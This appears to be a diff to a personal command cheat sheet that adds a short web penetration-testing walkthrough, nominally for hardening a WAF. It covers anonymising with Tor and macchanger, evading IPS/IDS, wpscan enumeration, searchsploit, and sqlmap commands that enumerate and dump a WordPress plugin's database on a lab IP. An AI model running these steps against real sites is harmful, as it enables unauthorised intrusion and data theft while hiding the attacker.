@@ -152,3 +152,19 @@ dd if=/dev/<INPUT DEVICE> bs=16M | nc 1234
 nc -p 1234 -l -vv I pv -r | dd of=/dev/<INPUT DEVICE> bs=16M
 
 ssh root@192.168.1.2 tcpdump -i any -U -s 0 -w - 'not port 22'
+
+# run web application penetration to know how to harder the WAF
+
+1.  Used Tor network also macchanger command to alter the MAC address for Anonymity.
+2.  Creating an offline copy of a web application use the tool such as BurpSuite free edition.
+    You can gather the information such as OS, Web Server, http version, openssl version offline to avoid triger IPS/IDS etc.  
+3.1 Scanning for vulnerabilities of web application use the tool such as OWASP-ZAP/Arachni/w3af
+    You can get the several result about the vulnerabilitie in this case.
+3.2 Scaning WordPress use the tool such as wpscan
+    wpscan --url http://192.168.1.100/wordpress/ --enumerate vp,vt --log wpscan.log
+4.  Use Metasploit to find the explot that got by step 3 such as 'searchsploit WordPress' etc 
+    Use SQLmap to get the information of database
+	sqlmap -u "http://192.168.1.100/wordpress/wp-content/plugins/wpSS/index.php?ss_id=1"
+	sqlmap -u "http://192.168.1.100/wordpress/wp-content/plugins/wpSS/index.php?ss_id=1" --dbs
+	sqlmap -u "http://192.168.1.100/wordpress/wp-content/plugins/wpSS/index.php?ss_id=1" --tables -D username(from above step)
+	you can hacked the database to dump the content of tables.
